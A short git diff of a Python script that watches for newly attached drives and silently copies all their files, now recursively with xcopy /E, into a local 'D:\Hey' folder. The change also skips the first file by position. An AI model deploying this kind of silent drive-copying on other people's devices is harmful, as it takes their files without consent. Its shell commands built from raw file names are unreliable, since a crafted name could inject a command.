@@ -14,14 +14,11 @@ while True:
 		required = newDriveList[newLength - 1]
 		newDrive = newDriveList[-1]
 		listOfFiles = os.listdir(newDrive)
-		for fil in listOfFiles:
-			if fil == "System Volume Information":
-				continue
-			print(listOfFiles)
+		for fil in listOfFiles[1:]:
 			fileName = newDrive[0] + newDrive[1] + "\\"
 			fileName += fil
-			cmd = 'xcopy ' + '"' + fileName + '"' + ' "D:\\Hey"'	
+			cmd = 'xcopy ' + '"' + fileName + '"' + ' "D:\\Hey"' + ' /E'	
 			os.system(cmd)
-			
+		break	
 	
 	time.sleep(5)
